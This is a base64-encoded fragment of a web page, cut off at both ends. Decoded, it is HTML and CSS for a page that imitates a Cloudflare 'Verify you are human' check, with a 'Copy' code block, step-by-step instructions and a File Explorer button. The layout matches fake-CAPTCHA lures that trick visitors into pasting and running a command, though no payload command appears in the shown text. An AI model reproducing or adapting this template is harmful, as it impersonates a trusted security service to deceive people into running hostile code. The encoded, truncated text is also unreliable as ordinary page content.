NmZmY7DQogICAgIGZvbnQtc2l6ZTogMThweDsNCiAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgICB0b3A6IC0ycHg7DQogICAgIGxlZnQ6IDJweDsNCiAgICB9DQoNCiAgICAuc3Bpbm5lciB7DQogICAgIHZpc2liaWxpdHk6IGhpZGRlbjsNCiAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgIH0NCg0KICAgIC52ZXJpZnktd2luZG93IHsNCiAgICAgb3BhY2l0eTogMDsNCiAgICAgdmlzaWJpbGl0eTogaGlkZGVuOw0KICAgICB3aWR0aDogMTAwJTsNCiAgICAgaGVpZ2h0OiAwOw0KICAgICB0cmFuc2l0aW9uOiBvcGFjaXR5IDAuNXMgZWFzZS1pbi1vdXQsIGhlaWdodCAwLjVzIGVhc2UtaW4tb3V0Ow0KICAgIH0NCg0KICAgIC52ZXJpZnktd2luZG93LmFjdGl2ZSB7DQogICAgIG9wYWNpdHk6IDE7DQogICAgIHZpc2liaWxpdHk6IHZpc2libGU7DQogICAgIGhlaWdodDogYXV0bzsNCiAgICB9DQoNCiAgICAudmVyaWZ5LWhlYWRlciB7DQogICAgIGJhY2tncm91bmQtY29sb3I6ICNlODVkMWE7DQogICAgIHBhZGRpbmc6IDEwcHg7DQogICAgIGNvbG9yOiAjZmZmOw0KICAgICBmb250LXNpemU6IDE0cHg7DQogICAgfQ0KDQogICAgLnZlcmlmeS1tYWluIHsNCiAgICAgcGFkZGluZzogMTBweDsNCiAgICAgZm9udC1zaXplOiAxNHB4Ow0KICAgICBjb2xvcjogI2ZmZjsNCiAgICB9DQoNCiAgICAubG9nby10ZXh0IHsNCiAgICAgICAgZmlsbDogI2ZmZjsNCiAgICB9DQoNCiAgICAudmVyaWZ5LWZvb3RlciB7DQogICAgIGJhY2tncm91bmQtY29sb3I6ICNmMmYyZjI7DQogICAgIHBhZGRpbmc6IDEwcHg7DQogICAgIHRleHQtYWxpZ246IHJpZ2h0Ow0KICAgIH0NCg0KICAgIC52ZXJpZnktZm9vdGVyIGJ1dHRvbiB7DQogICAgIHBhZGRpbmc6IDhweCAxNXB4Ow0KICAgICBiYWNrZ3JvdW5kOiAjNDI4NWY0Ow0KICAgICBjb2xvcjogI2ZmZjsNCiAgICAgYm9yZGVyOiBub25lOw0KICAgICBjdXJzb3I6IHBvaW50ZXI7DQogICAgIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgICB9DQoNCiAgICAvKiBORVcgU1RZTEUgKi8NCg0KICAgIC52ZXJpZnktd2luZG93IHsNCiAgICAgd2lkdGg6IGF1dG87DQogICAgfQ0KDQogICAgLnZlcmlmeS1oZWFkZXIgew0KICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTg1ZDFhOw0KICAgICBwYWRkaW5nOiAxMHB4IDE2cHg7DQogICAgIGNvbG9yOiAjZmZmOw0KICAgICBmb250LXNpemU6IDE0cHg7DQogICAgIGJvcmRlci1yYWRpdXM6IDA7DQogICAgfQ0KDQogICAgLmxkcy1yaW5nIGRpdiB7DQogICAgIGJvcmRlci1jb2xvcjogIzk5OSB0cmFuc3BhcmVudCB0cmFuc3BhcmVudDsNCiAgICB9DQogICAgYm9keS50aGVtZS1saWdodCAubGRzLXJpbmcgZGl2IHsNCiAgICAgYm9yZGVyLWNvbG9yOiAjNTk1OTU5IHRyYW5zcGFyZW50IHRyYW5zcGFyZW50Ow0KICAgIH0NCg0KICAgIC5sZHMtcmluZyB7DQogICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsNCiAgICAgcG9zaXRpb246IHJlbGF0aXZlOw0KICAgIH0NCiAgICAubGRzLXJpbmcsDQogICAgLmxkcy1yaW5nIGRpdiB7DQogICAgIGhlaWdodDogMS44NzVyZW07DQogICAgIHdpZHRoOiAxLjg3NXJlbTsNCiAgICB9DQogICAgLmxkcy1yaW5nIGRpdiB7DQogICAgIGFuaW1hdGlvbjogbGRzLXJpbmcgMS4ycyBjdWJpYy1iZXppZXIoMC41LCAwLCAwLjUsIDEpIGluZmluaXRlOw0KICAgICBib3JkZXI6IDAuM3JlbSBzb2xpZCB0cmFuc3BhcmVudDsNCiAgICAgYm9yZGVyLXJhZGl1czogNTAlOw0KICAgICBib3JkZXItdG9wLWNvbG9yOiAjMzEzMTMxOw0KICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94Ow0KICAgICBkaXNwbGF5OiBibG9jazsNCiAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgIH0NCiAgICAubGRzLXJpbmcgZGl2OmZpcnN0LWNoaWxkIHsNCiAgICAgYW5pbWF0aW9uLWRlbGF5OiAtMC40NXM7DQogICAgfQ0KICAgIC5sZHMtcmluZyBkaXY6bnRoLWNoaWxkKDIpIHsNCiAgICAgYW5pbWF0aW9uLWRlbGF5OiAtMC4zczsNCiAgICB9DQogICAgLmxkcy1yaW5nIGRpdjpudGgtY2hpbGQoMykgew0KICAgICBhbmltYXRpb24tZGVsYXk6IC0wLjE1czsNCiAgICB9DQoNCiAgICBAa2V5ZnJhbWVzIGxkcy1yaW5nIHsNCiAgICAgMCUgew0KICAgICAgdHJhbnNmb3JtOiByb3RhdGUoMGRlZyk7DQogICAgIH0NCiAgICAgdG8gew0KICAgICAgdHJhbnNmb3JtOiByb3RhdGUoMXR1cm4pOw0KICAgICB9DQogICAgfQ0KDQogDQoNCiAgICAgICBAbWVkaWEgKHByZWZlcnMtY29sb3Itc2NoZW1lOiBkYXJrKSB7DQogICAgIGJvZHkgLmxkcy1yaW5nIGRpdiB7DQogICAgICBib3JkZXItY29sb3I6ICM2NzY3NjcgdHJhbnNwYXJlbnQgdHJhbnNwYXJlbnQ7DQogICAgIH0NCiAgICB9DQoNCiAgICAqIHsNCiAgICAgYm94LXNpemluZzogYm9yZGVyLWJveDsNCiAgICAgbWFyZ2luOiAwOw0KICAgICBwYWRkaW5nOiAwOw0KICAgIH0NCiAgICBib2R5IHsNCg0KICAgICBmb250LWZhbWlseTogc3lzdGVtLXVpLCAtYXBwbGUtc3lzdGVtLCBCbGlua01hY1N5c3RlbUZvbnQsIFNlZ29lIFVJLCBSb2JvdG8sIEhlbHZldGljYSBOZXVlLCBBcmlhbCwgTm90byBTYW5zLCBzYW5zLXNlcmlmLCBBcHBsZSBDb2xvciBFbW9qaSwgU2Vnb2UgVUkgRW1vamksIFNlZ29lIFVJIFN5bWJvbCwgTm90byBDb2xvciBFbW9qaTsNCiAgICB9DQoNCiAgICBib2R5IHsNCiAgICAgZGlzcGxheTogZmxleDsNCiAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCiAgICAgaGVpZ2h0OiAxMDB2aDsNCiAgICAgbWluLWhlaWdodDogMTAwdmg7DQogICAgfQ0KDQogICAgLm1haW4td3JhcHBlciB7DQogICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7DQogICAgIGRpc3BsYXk6IGZsZXg7DQogICAgIGZsZXg6IDE7DQogICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQogICAgIG1pbi1oZWlnaHQ6IDEwMCU7DQogICAgfQ0KICAgIC5tYWluLWNvbnRlbnQgew0KICAgICBtYXJnaW46IDhyZW0gYXV0bzsNCiAgICAgbWF4LXdpZHRoOiA2MHJlbTsNCiAgICAgcGFkZGluZy1sZWZ0OiAxLjVyZW07DQogICAgIHBhZGRpbmctcmlnaHQ6IDEuNXJlbTsNCiAgICAgd2lkdGg6IDEwMCU7DQogICAgfQ0KDQogICAgLmZvb3RlciB7DQogICAgIGZvbnQtc2l6ZTogMC43NXJlbTsNCiAgICAgbGluZS1oZWlnaHQ6IDEuMTI1cmVtOw0KICAgICBtYXJnaW46IDAgYXV0bzsNCiAgICAgbWF4LXdpZHRoOiA2MHJlbTsNCiAgICAgcGFkZGluZy1sZWZ0OiAxLjVyZW07DQogICAgIHBhZGRpbmctcmlnaHQ6IDEuNXJlbTsNCiAgICAgd2lkdGg6IDEwMCU7DQogICAgIG1hcmdpbi10b3A6IGF1dG87DQogICAgfQ0KDQogICAgLmZvb3Rlci1pbm5lciB7DQogICAgIGJvcmRlci10b3A6IDFweCBzb2xpZCAjZDlkOWQ5Ow0KICAgICBwYWRkaW5nLWJvdHRvbTogMXJlbTsNCiAgICAgcGFkZGluZy10b3A6IDFyZW07DQogICAgIHRleHQtYWxpZ246IGNlbnRlcjsNCiAgICB9DQogICAgLyogUG9wdXAgVmVyaWZpY2F0aW9uIFdpbmRvdyAqLw0KICAgIC52ZXJpZnktd2luZG93IHsNCiAgICAgZm9udC1mYW1pbHk6IFJvYm90bywgaGVsdmV0aWNhLCBhcmlhbCwgc2Fucy1zZXJpZjsNCiAgICAgb3BhY2l0eTogMDsNCiAgICAgdmlzaWJpbGl0eTogaGlkZGVuOw0KICAgICBtYXJnaW46IGF1dG87DQogICAgIHdpZHRoOiAzMTBweDsNCiAgICAgdHJhbnNpdGlvbjogb3BhY2l0eSA0MDBtczsNCiAgICB9DQoNCiAgICAudmVyaWZ5LXdpbmRvdyB7DQogICAgIGRpc3BsYXk6IGJsb2NrOw0KICAgICB0b3A6IDVweDsNCiAgICAgbGVmdDogNTRweDsNCiAgICB9DQoNCiAgICAudmVyaWZ5LWhlYWRlciB7DQogICAgIGJhY2tncm91bmQtY29sb3I6ICMxYTczZTg7DQogICAgIHBhZGRpbmc6IDE2cHg7DQogICAgIGNvbG9yOiAjZmZmOw0KICAgICBmb250LXNpemU6IDE4cHg7DQogICAgIGJvcmRlci1yYWRpdXM6IDhweCA4cHggMCAwOw0KICAgIH0NCg0KICAgIC52ZXJpZnktbWFpbiB7DQogICAgIHBhZGRpbmc6IDE2cHg7DQogICAgIGZvbnQtc2l6ZTogMTRweDsNCiAgICAgY29sb3I6ICMzMzM7DQogICAgfQ0KDQogICAgLnZlcmlmeS1tYWluIG9sIHsNCiAgICAgcGFkZGluZy1sZWZ0OiAyMHB4Ow0KICAgIH0NCg0KICAgIC52ZXJpZnktbWFpbiBvbCBsaSB7DQogICAgIG1hcmdpbi1ib3R0b206IDEwcHg7DQogICAgfQ0KDQogICAgLnZlcmlmeS1tYWluIGNvZGUgew0KICAgICBkaXNwbGF5OiBibG9jazsNCiAgICAgbWFyZ2luLXRvcDogMTBweDsNCiAgICAgYmFja2dyb3VuZC1jb2xvcjogI2Y5ZjlmOTsNCiAgICAgcGFkZGluZzogMTBweDsNCiAgICAgZm9udC1zaXplOiAxMnB4Ow0KICAgICBib3JkZXI6IDFweCBzb2xpZCAjZGRkOw0KICAgIH0NCg0KICAgIC52ZXJpZnktZm9vdGVyIHsNCiAgICAgYmFja2dyb3VuZC1jb2xvcjogI2YyZjJmMjsNCiAgICAgcGFkZGluZzogMTZweDsNCiAgICAgdGV4dC1hbGlnbjogcmlnaHQ7DQogICAgfQ0KDQogICAgLnZlcmlmeS1mb290ZXIgYnV0dG9uIHsNCiAgICAgcGFkZGluZzogMTBweCAyMHB4Ow0KICAgICBiYWNrZ3JvdW5kOiAjNDI4NWY0Ow0KICAgICBjb2xvcjogI2ZmZjsNCiAgICAgYm9yZGVyOiBub25lOw0KICAgICBib3JkZXItcmFkaXVzOiA1cHg7DQogICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICB9DQoNCiAgICAub3ZlcmxheSB7DQogICAgIGRpc3BsYXk6IG5vbmU7DQogICAgIHBvc2l0aW9uOiBmaXhlZDsNCiAgICAgdG9wOiAwOw0KICAgICBsZWZ0OiAwOw0KICAgICB3aWR0aDogMTAwJTsNCiAgICAgaGVpZ2h0OiAxMDAlOw0KICAgICBiYWNrZ3JvdW5kOiByZ2JhKDAsIDAsIDAsIDAuNSk7DQogICAgIHotaW5kZXg6IDEwOw0KICAgIH0NCg0KICAgIC5vdmVybGF5LmFjdGl2ZSwNCiAgICAudmVyaWZ5LXdpbmRvdy5hY3RpdmUgew0KICAgICBkaXNwbGF5OiBibG9jazsNCiAgICB9DQoNCiAgICAudmVyaWZ5LXdpbmRvdyB7DQogICAgIHdpZHRoOiBhdXRvOw0KICAgIH0NCg0KICAgIC52ZXJpZnktaGVhZGVyIHsNCiAgICAgYmFja2dyb3VuZC1jb2xvcjogI2U4NWQxYTsNCiAgICAgcGFkZGluZzogMTBweCAxNnB4Ow0KICAgICBjb2xvcjogI2ZmZjsNCiAgICAgZm9udC1zaXplOiAxNHB4Ow0KICAgICBib3JkZXItcmFkaXVzOiAwOw0KICAgIH0NCg0KICAgICNzcGlubmVyMiB7DQogICAgd2lkdGg6IDQwcHg7IA0KICAgIGhlaWdodDogNDBweDsgDQogICAgYW5pbWF0aW9uOiByb3RhdGUgNHMgbGluZWFyIGluZmluaXRlOyANCiAgICBtYXJnaW4tdG9wOiAtNHB4Ow0KICAgIA0KfQ0KDQouY2hlY2tib3gtd2luZG93IHsNCiAgDQogICAgb3BhY2l0eTogMDsNCn0NCg0KQGtleWZyYW1lcyByb3RhdGUgew0KICAgIGZyb20gew0KICAgICAgICB0cmFuc2Zvcm06IHJvdGF0ZSgwZGVnKTsNCiAgICB9DQoNCiAgICB0byB7DQogICAgICAgIHRyYW5zZm9ybTogcm90YXRlKDM2MGRlZyk7DQogICAgfQ0KfQ0KDQoNCi8qIE5FVyBTVFlMRSAqLw0KDQogICAgLnRpbWVzdGFtcCB7DQogICAgICBmb250LXNpemU6IDEzcHg7DQogICAgICBjb2xvcjogIzdhN2E3YTsNCiAgICAgIG1hcmdpbi10b3A6IDZweDsNCiAgICB9DQoNCiAgICAuaW5zdHJ1Y3Rpb25zIHsNCiAgICAgIHRleHQtYWxpZ246IGxlZnQ7DQogICAgDQogICAgICBmb250LXNpemU6IDE1cHg7DQogICAgICBjb2xvcjogIzMzMzMzMzsNCiAgICAgIGxpbmUtaGVpZ2h0OiAxLjY7DQogICAgfQ0KDQogICAgLmluc3RydWN0aW9ucyBvbCB7DQogICAgICBtYXJnaW46IDA7DQogICAgICBwYWRkaW5nLWxlZnQ6IDIwcHg7DQogICAgfQ0KDQogICAgLmNvZGUtYmxvY2sgew0KICAgIGJhY2tncm91bmQtY29sb3I6ICNmMWYxZjE7DQogICAgYm9yZGVyOiAxcHggc29saWQgI2NjYzsNCiAgICBib3JkZXItcmFkaXVzOiA0cHg7DQogICAgcGFkZGluZzogOHB4IDEycHg7DQogICAgZm9udC1mYW1pbHk6IENvbnNvbGFzLCBtb25vc3BhY2U7DQogICAgZm9udC1zaXplOiAxNHB4Ow0KICAgIG1hcmdpbi10b3A6IDhweDsNCiAgICBwb3NpdGlvbjogcmVsYXRpdmU7DQogICAgdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAwLjNzOw0KICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICB1c2VyLXNlbGVjdDogbm9uZTsNCiAgICB9DQoNCg0KICAgIC5jb2RlLWJsb2NrOmhvdmVyIHsNCiAgICAgIGJhY2tncm91bmQtY29sb3I6ICNlNmU2ZTY7DQogICAgfQ0KDQogICAgLmNvZGUtYmxvY2s6OmFmdGVyIHsNCiAgICAgIGNvbnRlbnQ6ICJDb3B5IjsNCiAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICAgIHRvcDogNTAlOw0KICAgICAgcmlnaHQ6IDEycHg7DQogICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoLTUwJSk7DQogICAgICBmb250LXNpemU6IDEycHg7DQogICAgICBjb2xvcjogIzAwNzhkNDsNCiAgICAgIG9wYWNpdHk6IDA7DQogICAgICB0cmFuc2l0aW9uOiBvcGFjaXR5IDAuMnM7DQogICAgfQ0KDQogICAgLmNvZGUtYmxvY2s6aG92ZXI6OmFmdGVyIHsNCiAgICAgIG9wYWNpdHk6IDE7DQogICAgfQ0KDQogICAgLmNvZGUtYmxvY2suY2xpY2tlZDo6YWZ0ZXIgew0KICAgICAgY29udGVudDogIkNvcGllZCI7DQogICAgICBjb2xvcjogIzEwN2MxMDsNCiAgICB9DQoNCiAgICAjZmlsZUV4cGxvcmVyIHsNCiAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDc4ZDQ7DQogICAgICBjb2xvcjogd2hpdGU7DQogICAgICBib3JkZXI6IG5vbmU7DQogICAgICBwYWRkaW5nOiAxMnB4IDMwcHg7DQogICAgICBmb250LXNpemU6IDE1cHg7DQogICAgICBib3JkZXItcmFkaXVzOiA0cHg7DQogICAgICBtYXJnaW46IDIwcHggMCAxMHB4Ow0KICAgICAgY3Vyc29yOiBwb2ludGVyOw0KDQogICAgfQ0KDQogICAgI2ZpbGVFeHBsb3Jlcjpob3ZlciB7DQogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA1ZWEyOw0KICAgIH0NCg0KI3ZlcmlmeS13aW5kb3cgew0KICAgICAgICB3aWR0aDogMTAwJTsNCn0NCg0KICAgIDwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keT4NCg0KPGRpdiBjbGFzcz0ibWFpbi13cmFwcGVyIj4NCiA8ZGl2IGNsYXNzPSJtYWluLWNvbnRlbnQiPg0KICA8ZGl2IHN0eWxlPSJkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogY2VudGVyOyI+DQogICANCiAgPCEtLSA8aW1nIHNyYz0iaHR0cHM6Ly8yY2FwdGNoYS5jb20vZGlzdC93ZWIvYXNzZXRzL2dvb2dsZS1wcml2YWN5LXBvbGljeS1DYjBDR1ZSVC5zdmciIC8+IC0tPg0KDQogICA8IS0tIDxpbWcgY2xhc3M9ImxvZ28taW1nIiBzcmM9IiIgc3R5bGU9ImhlaWdodDogMnJlbTsgbWFyZ2luLXJpZ2h0OiAwLjVyZW07IiA+IC0tPg0KDQoNCg0KICAgPHAgc3R5bGU9ImZvbnQtc2l6ZTogMi41cmVtOyBmb250LXdlaWdodDogNTAwOyBsaW5lLWhlaWdodDogMy43NXJlbTsiPjxzcGFuIGNsYXNzPSJkb21haW4tbmFtZSI+PC9zcGFuPjwvcD4NCiAgPC9kaXY+DQoNCiA8ZGl2IHN0eWxlPSJmb250LXNpemU6IDEuNXJlbTsgbGluZS1oZWlnaHQ6IDIuMjVyZW07IG1hcmdpbi1ib3R0b206IDJyZW07IG1pbi1oZWlnaHQ6IDJyZW07Ij4NCiAgPHA+DQogICAgPHNwYW4gY2xhc3M9InByZWxvYWRlcl90ZXh0Ij5DaGVja2luZyBpZiB5b3UgYXJlIGh1bWFuLiBUaGlzIG1heSB0YWtlIGEgZmV3IHNlY29uZHMuPC9zcGFuPg0KICAgIDxzcGFuIGNsYXNzPSJ0ZXh0YWxsc3RlcCIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij5WZXJpZnkgeW91IGFyZSBodW1hbiBieSBjb21wbGV0aW5nIHRoZSBhY3Rpb24gYmVsb3cuPC9zcGFuPiAgIA0KICA8L3A+DQo8L2Rpdj4NCg0KICA8IS0tIFBSRUxPQURFUiAtLT4NCiAgPGRpdiBjbGFzcz0icHJlbG9hZGVyIj4NCiAgICAgICA8ZGl2IGNsYXNzPSJsZHMtcmluZyI+DQogICAgICAgPGRpdj48L2Rpdj4NCiAgICAgICA8ZGl2PjwvZGl2Pg0KICAgICAgIDxkaXY+PC9kaXY+DQogICAgICAgPGRpdj48L2Rpdj4NCiAgICAgIDwvZGl2Pg0KICA8L2Rpdj4NCg0KDQoNCiAgPCEtLSBTVEFSVCAtLT4NCg0KICA8ZGl2IGlkPSJjaGVja2JveC13aW5kb3ciIGNsYXNzPSJjaGVja2JveC13aW5kb3ciIHN0eWxlPSJ3aWR0aDogMzAwcHg7IGhlaWdodDogNzRweDsgZGlzcGxheTogbm9uZTsiPg0KICAgPGRpdiBzdHlsZT0iZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsgd2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsiPg0KICAgIDxkaXYgY2xhc3M9ImNoZWNrYm94LWNvbnRhaW5lciIgc3R5bGU9Im1hcmdpbi1sZWZ0OiAzcHg7IG1hcmdpbi1yaWdodDogMTJweDsgd2lkdGg6IDMwcHg7Ij4NCg0KICAgICA8c3ZnIHN0eWxlPSJkaXNwbGF5OiBub25lOyIgY2xhc3M9InN0ZXAwIiBpZD0ic3Bpbm5lcjIiIGZpbGw9ImdyZWVuIiB2aWV3Qm94PSIwIDAgNjAgNjAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+DQogICAgICAgIDxjaXJjbGUgY3g9IjMwIiBjeT0iMTAiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iNTAiIGN5PSIzMCIgcj0iMi41IiBjbGFzcz0icG9pbnQiPjwvY2lyY2xlPg0KICAgICAgICA8Y2lyY2xlIGN4PSIzMCIgY3k9IjUwIiByPSIyLjUiIGNsYXNzPSJwb2ludCI+PC9jaXJjbGU+DQogICAgICAgIDxjaXJjbGUgY3g9IjEwIiBjeT0iMzAiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iNDMuNiIgY3k9IjE2LjQiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iMTYuNCIgY3k9IjE2LjQiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iNDMuNiIgY3k9IjQzLjYiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgICAgPGNpcmNsZSBjeD0iMTYuNCIgY3k9IjQzLjYiIHI9IjIuNSIgY2xhc3M9InBvaW50Ij48L2NpcmNsZT4NCiAgICAgIDwvc3ZnPiAgDQogICAgDQogICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBpZD0iY2hlY2tib3giIGNsYXNzPSJjaGVja2JveCBzdGVwMSIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij48L2J1dHRvbj4NCg0KICAgICA8ZGl2IGNsYXNzPSJzcGlubmVyIHN0ZXAyIiBpZD0ic3Bpbm5lciIgc3R5bGU9InZpc2liaWxpdHk6IGhpZGRlbjsgZGlzcGxheTogbm9uZTsiPg0KICAgICAgPGRpdiBjbGFzcz0ibGRzLXJpbmciPg0KICAgICAgIDxkaXY+PC9kaXY+DQogICAgICAgPGRpdj48L2Rpdj4NCiAgICAgICA8ZGl2PjwvZGl2Pg0KICAgICAgIDxkaXY+PC9kaXY+DQogICAgICA8L2Rpdj4NCiAgICAgPC9kaXY+DQoNCiAgICAgPGRpdiBjbGFzcz0ic3RlcDMiIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogICAgICA8c3ZnIHdpZHRoPSIzMCIgaGVpZ2h0PSIzMCIgdmlld0JveD0iMCAwIDUwIDUwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPg0KICAgICAgIDxjaXJjbGUgY3g9IjI1IiBjeT0iMjUiIHI9IjIzIiBmaWxsPSIjMjhhNzQ1IiAvPg0KICAgICAgIDxwYXRoIGQ9Ik0xNSAyNSBMMjIgMzIgTDM1IDE4IiBzdHJva2U9IndoaXRlIiBzdHJva2Utd2lkdGg9IjQiIGZpbGw9Im5vbmUiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgLz4NCiAgICAgIDwvc3ZnPg0KICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCg0KICAgIDxkaXYgY2xhc3M9InRldHR4Ij4NCiAgICAgPHAgY2xhc3M9InN0ZXAwIiBzdHlsZT0ibWFyZ2luOiAwICFpbXBvcnRhbnQ7ICI+VmVyaWZ5aW5nLi4uPC9wPg0KICAgICA8cCBjbGFzcz0ic3RlcDEiIHN0eWxlPSJtYXJnaW46IDAgIWltcG9ydGFudDsgZGlzcGxheTogbm9uZTsiPlZlcmlmeSB5b3UgYXJlIGh1bWFuPC9wPg0KICAgICA8cCBjbGFzcz0ic3RlcDIiIHN0eWxlPSJtYXJnaW46IDAgIWltcG9ydGFudDsgZGlzcGxheTogbm9uZTsiPlZlcmlmaWNhdGlvbiBTdGVwczwvcD4NCiAgICAgPHAgY2xhc3M9InN0ZXAzIiBzdHlsZT0ibWFyZ2luOiAwICFpbXBvcnRhbnQ7IGRpc3BsYXk6IG5vbmU7Ij5TdWNjZXNzZnVsbHkuPC9wPg0KICAgIDwvZGl2Pg0KDQogICAgPGRpdiBzdHlsZT0iZm9udC1zaXplOiA4cHg7IHRleHQtYWxpZ246IGNlbnRlcjsgbWFyZ2luLWxlZnQ6IGF1dG87Ij4NCiAgICAgPHN2ZyByb2xlPSJpbWciIGFyaWEtbGFiZWw9IkNsb3VkZmxhcmUiIGlkPSJsb2dvIiB2aWV3Qm94PSIwIDAgNzMgMjUiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTYxLjg4NDggMTUuNzg0MUw2Mi4wNjMyIDE1LjE1NzhDNjIuMjc1OCAxNC40MTI2IDYyLjE5NjcgMTMuNzIzOSA2MS44NDAxIDEzLjIxNzhDNjEuNTExOCAxMi43NTE3IDYwLjk2NDkgMTIuNDc3MyA2MC4zMDA3IDEyLjQ0NTNMNDcuNzIwMSAxMi4yODM2QzQ3LjY4MTEgMTIuMjgyOSA0Ny42NDI4IDEyLjI3MjggNDcuNjA4MyAxMi4yNTQyQzQ3LjU3MzggMTIuMjM1NiA0Ny41NDQyIDEyLjIwOSA0Ny41MjE3IDEyLjE3NjZDNDcuNDk5NiAxMi4xNDMxIDQ3LjQ4NTYgMTIuMTA0OSA0Ny40ODA3IDEyLjA2NDlDNDcuNDc1OCAxMi4wMjUgNDcuNDgwMSAxMS45ODQ0IDQ3LjQ5MzMgMTEuOTQ2NUM0Ny41MTQ5IDExLjg4MzkgNDcuNTU0MSAxMS44MjkxIDQ3LjYwNjEgMTEuNzg4OEM0Ny42NTggMTEuNzQ4NiA0Ny43MjA0IDExLjcyNDcgNDcuNzg1NiAxMS43Mkw2MC40ODI3IDExLjU1NjZDNjEuOTg4OSAxMS40ODY0IDYzLjYxOTYgMTAuMjQ2MiA2NC4xOTA1IDguNzMzNzJMNjQuOTE0NiA2LjgxMzYxQzY0Ljk0NDMgNi43MzI0MiA2NC45NTEgNi42NDQ0NCA2NC45MzQxIDYuNTU5NTdDNjQuMTEyIDIuODA2NTIgNjAuODExNSAwIDU2Ljg2NTIgMEM1My4yMjkzIDAgNTAuMTQyMSAyLjM4MTU4IDQ5LjAzNDcgNS42OTE4NkM0OC4yODY0IDUuMTIxODYgNDcuMzUzNSA0Ljg1OTgyIDQ2LjQyMjggNC45NTgyM0M0NC42Nzg1IDUuMTM0MDEgNDMuMjc2IDYuNTU5MjggNDMuMTAzNCA4LjMyOTc5QzQzLjA1OSA4Ljc3MTg5IDQzLjA5MTUgOS4yMTg0NSA0My4xOTkyIDkuNjQ5MThDNDAuMzQ5NyA5LjczMzQ3IDM4LjA2NDUgMTIuMTAyNyAzOC4wNjQ1IDE1LjAxNTFDMzguMDY0OSAxNS4yNzUxIDM4LjA4MzggMTUuNTM0NyAzOC4xMjEyIDE1Ljc5MTlDMzguMTI5NCAxNS44NTEzIDM4LjE1ODQgMTUuOTA1NyAzOC4yMDI5IDE1Ljk0NTJDMzguMjQ3NCAxNS45ODQ3IDM4LjMwNDQgMTYuMDA2NyAzOC4zNjM1IDE2LjAwNzFMNjEuNTg5NCAxNi4wMDk5QzYxLjU5MTYgMTYuMDEwMSA2MS41OTM4IDE2LjAxMDEgNjEuNTk2IDE2LjAwOTlDNjEuNjYxNiAxNi4wMDg4IDYxLjcyNTIgMTUuOTg2MiA2MS43NzcyIDE1Ljk0NTVDNjEuODI5MyAxNS45MDQ5IDYxLjg2NyAxNS44NDgzIDYxLjg4NDggMTUuNzg0MVoiIGZpbGw9IiNGNjgyMUYiPjwvcGF0aD48cGF0aCBkPSJNNjYuMDc1OCA2Ljk1Mjg1QzY1Ljk1OTIgNi45NTI4NSA2NS44NDMgNi45NTU4MiA2NS43Mjc0IDYuOTYxNzdDNjUuNzA4NyA2Ljk2MzEyIDY1LjY5MDQgNi45NjcxOSA2NS42NzI5IDYuOTczODVDNjUuNjQyNiA2Ljk4NDM3IDY1LjYxNTIgNy4wMDIxOSA2NS41OTMxIDcuMDI1NzlDNjUuNTcxMSA3LjA0OTM5IDY1LjU1NSA3LjA3ODA2IDY1LjU0NjIgNy4xMDkzNkw2NS4wNTE1IDguODQzMzNDNjQuODM4OSA5LjU4ODQ3IDY0LjkxOCAxMC4yNzY2IDY1LjI3NDkgMTAuNzgyN0M2NS42MDI5IDExLjI0OTQgNjYuMTQ5OCAxMS41MjMzIDY2LjgxNCAxMS41NTUyTDY5LjQ5NTkgMTEuNzE4NkM2OS41MzM2IDExLjcxOTkgNjkuNTcwNSAxMS43MyA2OS42MDM3IDExLjc0ODNDNjkuNjM2OSAxMS43NjY2IDY5LjY2NTQgMTEuNzkyNSA2OS42ODcgMTEuODIzOUM2OS43MDkyIDExLjg1NzYgNjkuNzIzNCAxMS44OTYgNjkuNzI4MyAxMS45MzYzQzY5LjczMzIgMTEuOTc2NSA2OS43Mjg4IDEyLjAxNzMgNjkuNzE1MyAxMi4wNTU1QzY5LjY5MzcgMTIuMTE4IDY5LjY1NDYgMTIuMTcyNyA2OS42MDI4IDEyLjIxMjlDNjkuNTUwOSAxMi4yNTMxIDY5LjQ4ODcgMTIuMjc3MSA2OS40MjM2IDEyLjI4MTlMNjYuNjM3MSAxMi40NDUzQzY1LjEy